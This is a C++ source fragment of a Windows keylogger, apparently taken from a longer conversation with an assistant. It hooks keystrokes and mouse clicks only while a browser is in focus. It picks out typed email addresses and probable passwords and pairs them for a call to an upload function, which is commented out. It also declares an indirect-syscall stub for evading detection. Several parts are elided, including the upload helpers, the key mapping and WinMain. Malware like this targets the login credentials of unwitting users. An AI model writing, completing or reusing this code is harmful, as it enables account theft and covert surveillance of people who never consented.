#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include <string>
#include <regex>
#include <sstream>
#include <fstream>
#include <shlobj.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

extern "C" {
    DWORD sys_number = 0;
    UINT_PTR sys_addr = 0;
}
extern "C" void DoIndirectSyscall();

// 1. Target Browser List
std::vector<std::string> TARGET_APPS = { "chrome.exe", "msedge.exe", "brave.exe", "firefox.exe" };

bool IsTargetAppActive() {
    DWORD processId;
    HWND hwnd = GetForegroundWindow();
    GetWindowThreadProcessId(hwnd, &processId);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (hProcess) {
        char buffer[MAX_PATH];
        DWORD size = sizeof(buffer);
        if (QueryFullProcessImageNameA(hProcess, 0, buffer, &size)) {
            std::string path(buffer);
            std::string exeName = path.substr(path.find_last_of("\\/") + 1);
            std::transform(exeName.begin(), exeName.end(), exeName.begin(), ::tolower);
            for (const std::string& target : TARGET_APPS) {
                if (exeName == target) { CloseHandle(hProcess); return true; }
            }
        }
        CloseHandle(hProcess);
    }
    return false;
}

// 2. Data Processing Logic
std::string buffer = "";
std::string savedEmail = "";

bool IsEmail(const std::string& s) {
    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
    return std::regex_match(s, e_reg);
}

// Helper functions (GetMachineId, GetDynamicOS, UploadData, etc. go here...)
// [Refer to previous code blocks for full implementations of these helpers]

void ProcessBuffer() {
    if (buffer.empty()) return;
    if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }

    // Check Email FIRST (even if it's 30 characters long)
    if (IsEmail(buffer)) {
        savedEmail = buffer;
    } 
    // Check Password SECOND (Standalone or Paired)
    else if (buffer.length() >= 8) {
        std::string emailToUpload = savedEmail.empty() ? "N/A (Standalone)" : savedEmail;
        // UploadData(emailToUpload, buffer); 
        savedEmail.clear(); 
    }
    buffer.clear();
}

// 3. The Hook Callbacks
LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) {
        if (!IsTargetAppActive()) return CallNextHookEx(NULL, n, w, l);
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;

        // TRIGGER: Enter or Tab
        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) {
            ProcessBuffer();
        } else {
            // ... [Keyboard mapping logic from your original code] ...
        }
    }
    return CallNextHookEx(NULL, n, w, l);
}

LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
    // TRIGGER: Left Mouse Click
    if (n == HC_ACTION && w == WM_LBUTTONDOWN) {
        if (IsTargetAppActive()) ProcessBuffer();
    }
    return CallNextHookEx(NULL, n, w, l);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    // Initialization and Hooks...
    return 0;
}
